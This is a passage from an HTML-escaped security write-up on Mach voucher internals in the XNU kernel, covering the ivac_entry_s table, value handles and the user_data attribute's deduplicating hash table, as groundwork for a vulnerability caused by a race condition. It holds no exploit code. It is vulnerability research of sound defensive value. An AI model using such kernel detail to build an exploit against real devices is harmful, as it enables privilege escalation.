 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivam_release &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;user_data_release&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;ivam_flags &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;IVAM_FLAGS_NONE&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;};&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;Those five function pointers are the only interface from the generic voucher code into the type-specific code. The interface may seem simple but there are some tricky subtleties in there; we&amp;#39;ll get to that later!&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;Let&amp;#39;s go back to the generic &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ipc_voucher_attr_control&lt;/span&gt;&lt;span&gt;&amp;nbsp;structure which maintains the &amp;quot;values&amp;quot; for each key in a type-agnostic way. The most important field is &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivac_entry_t &amp;nbsp;ivac_table&lt;/span&gt;&lt;span&gt;, which is &lt;/span&gt;&lt;span&gt;an array of &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivac_entry_s&lt;/span&gt;&lt;span&gt;&amp;#39;s&lt;/span&gt;&lt;span&gt;. It&amp;#39;s an index into this table which is stored in each voucher&amp;#39;s &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;iv_table&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;Here&amp;#39;s the structure of each entry in that table:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.777c9f9c4271dfb1023047f7a3639b98f2fed9d2&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.8&quot;&gt;&lt;/a&gt;&lt;table class=&quot;BGLtzooHlW-c12&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;BGLtzooHlW-c1&quot;&gt;&lt;td class=&quot;BGLtzooHlW-c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;ivac_entry_s &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; iv_value_handle_t ivace_value&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; iv_value_refs_t &amp;nbsp; ivace_layered&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/* layered effective entry */&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace_releasing&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/* release in progress */&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace_free&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/* on freelist */&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace_persist&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/* Persist the entry, don&amp;#39;t&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;count made refs */&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace_refs&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c15&quot;&gt;28&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/* reference count */&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;union&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; iv_value_refs_t ivaceu_made&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/* made count (non-layered) */&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; iv_index_t &amp;nbsp; &amp;nbsp; &amp;nbsp;ivaceu_layer&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/* next effective layer&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; (layered) */&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;ivace_u&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; iv_index_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;ivace_next&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/* hash or freelist */&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; iv_index_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;ivace_index&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c7&quot;&gt;/* hash head (independent) */&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;};&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace_refs&lt;/span&gt;&lt;span&gt;&amp;nbsp;is a reference count for this table index. Note that this entry is &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c17&quot;&gt;inline&lt;/span&gt;&lt;span&gt;&amp;nbsp;in an array;&lt;/span&gt;&lt;span&gt;&amp;nbsp;so this reference count going to zero doesn&amp;#39;t cause the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivac_entry_s&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;to be free&amp;#39;d back to a kernel allocator (like the zone allocator for example.) Instead, it moves this table index onto a freelist of empty entries. The table can grow but never shrink.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;Table entries which aren&amp;#39;t free store a type-specific &amp;quot;handle&amp;quot; in &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace_value&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;. Here&amp;#39;s the typedef chain for that type:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.9c51000ec2d891dfe4854f95d2bbcf210598beb6&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.9&quot;&gt;&lt;/a&gt;&lt;table class=&quot;BGLtzooHlW-c12&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;BGLtzooHlW-c1&quot;&gt;&lt;td class=&quot;BGLtzooHlW-c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c3&quot;&gt;iv_value_handle_t ivace_value&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;typedef&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;mach_voucher_attr_value_handle_t iv_value_handle_t&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;typedef&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;uint64_t mach_voucher_attr_value_handle_t&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;The handle is a &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;uint64_t&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;but in reality the attrs can (and do) store pointers there, hidden behind casts.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;A guarantee made by the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;attr_control&lt;/span&gt;&lt;span&gt;&amp;nbsp;is that there will only ever be one (live) &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivac_entr&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;y_s&lt;/span&gt;&lt;span&gt;&amp;nbsp;for a particular &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace_value&lt;/span&gt;&lt;span&gt;. This means that each time a new &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace_value&lt;/span&gt;&lt;span&gt;&amp;nbsp;needs an &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivac_entry&lt;/span&gt;&lt;span&gt;&amp;nbsp;the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;attr_control&lt;/span&gt;&lt;span&gt;&amp;#39;s &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivac_table&lt;/span&gt;&lt;span&gt;&amp;nbsp;needs to be searched to see if a matching value is already present. To speed this up in-use &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivac_entries&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;are linked together in hash buckets so that a (hopefully significantly) shorter linked-list of entries can be searched rather than a linear scan of the whole table. (Note that it&amp;#39;s not a linked-list of pointers; each link in the chain is an index into the table.)&lt;/span&gt;&lt;/p&gt;&lt;h2 class=&quot;BGLtzooHlW-c5 BGLtzooHlW-c18&quot; id=&quot;h.lsgi9jwnyyz4&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c20&quot;&gt;Userdata attrs&lt;/span&gt;&lt;/h2&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;user_data&lt;/span&gt;&lt;span&gt;&amp;nbsp;is one of the four types of supported, implemented voucher attr types. It&amp;#39;s only purpose is to manage buffers of arbitrary, user controlled data. Since the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;attr_control&lt;/span&gt;&lt;span&gt;&amp;nbsp;performs deduping only on the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace_value&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;(which is a pointer) the userdata attr manager is responsible for ensuring that userdata values which have identical buffer values (matching length and bytes) have identical pointers.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;To do this it maintains a hash table of &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;user_data_value_element&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;structures, which wrap a variable-sized buffer of bytes:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.300b9d1f1ee1dcff9a3ee0de164a2bc6bc43ea65&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.10&quot;&gt;&lt;/a&gt;&lt;table class=&quot;BGLtzooHlW-c12&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;BGLtzooHlW-c1&quot;&gt;&lt;td class=&quot;BGLtzooHlW-c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c6&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp;user_data_value_element &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;{&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; mach_voucher_attr_value_reference_t e_made&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; mach_voucher_attr_content_size_t &amp;nbsp; &amp;nbsp;e_size&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; iv_index_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;e_sum&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; iv_index_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;e_hash&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; queue_chain_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; e_hash_link&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c4&quot;&gt;&amp;nbsp; uint8_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; e_data&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;[];&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c2&quot;&gt;};&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;Each inline &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;e_data&lt;/span&gt;&lt;span&gt;&amp;nbsp;buffer can be up to 16KB. &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;e_hash_link&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;stores the hash-table bucket list pointer.&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;e_made&lt;/span&gt;&lt;span&gt;&amp;nbsp;is not a simple reference count. Looking through the code you&amp;#39;ll notice that there are no places where it&amp;#39;s ever decremented. Since there should (nearly) always be a 1:1 mapping between an &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;ivace_entry&lt;/span&gt;&lt;span&gt;&amp;nbsp;and a &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;user_data_value_element&lt;/span&gt;&lt;span&gt;&amp;nbsp;this structure shouldn&amp;#39;t need to be reference counted. There is however one very fiddly race condition (which &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c17&quot;&gt;isn&amp;#39;t&lt;/span&gt;&lt;span&gt;&amp;nbsp;the race condition which causes the vulnerability!) which necessitates the &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;e_made&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&amp;nbsp;field. This race condition is sort-of documented and we&amp;#39;ll get there eventually...&lt;/span&gt;&lt;/p&gt;&lt;h2 class=&quot;BGLtzooHlW-c18 BGLtzooHlW-c5&quot; id=&quot;h.o5bp0ln346i3&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c20&quot;&gt;Recipes&lt;/span&gt;&lt;/h2&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5&quot;&gt;&lt;span&gt;The &lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c11&quot;&gt;host_create_mach_voucher&lt;/span&gt;&lt;span&gt;&amp;nbsp;host port &lt;/span&gt;&lt;span&gt;MIG&lt;/span&gt;&lt;span&gt;&amp;nbsp;(&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c21&quot;&gt;&lt;a class=&quot;BGLtzooHlW-c251&quot; href=&quot;https://www.nextop.de/NeXTstep_3.3_Developer_Documentation/OperatingSystem/Part1_Mach/02_Messages/Messages.htmld/index.html&quot;&gt;Mach Interface Generator&lt;/a&gt;&lt;/span&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;) method is the userspace interface for creating vouchers:&lt;/span&gt;&lt;/p&gt;
 &lt;p class=&quot;BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8&quot;&gt;&lt;span class=&quot;BGLtzooHlW-c10&quot;&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=&quot;t.3b86534681bae3851c58fa2f335e430bc6b5a4cb&quot;&gt;&lt;/a&gt;&lt;a id=&quot;t.11&quot;&gt;&lt;/a&gt;&lt;table class=&quot;BGLtzooHlW-c12&quot;&gt;&lt;tbody&gt;&lt;tr class=&quot;BGLtzooHlW-c1&quot;&gt;&lt;td class=&quot;BGLtzooHlW-c13&quot; colspan=&quot;1&quot; rowspan=&quot;1&quot;&gt;
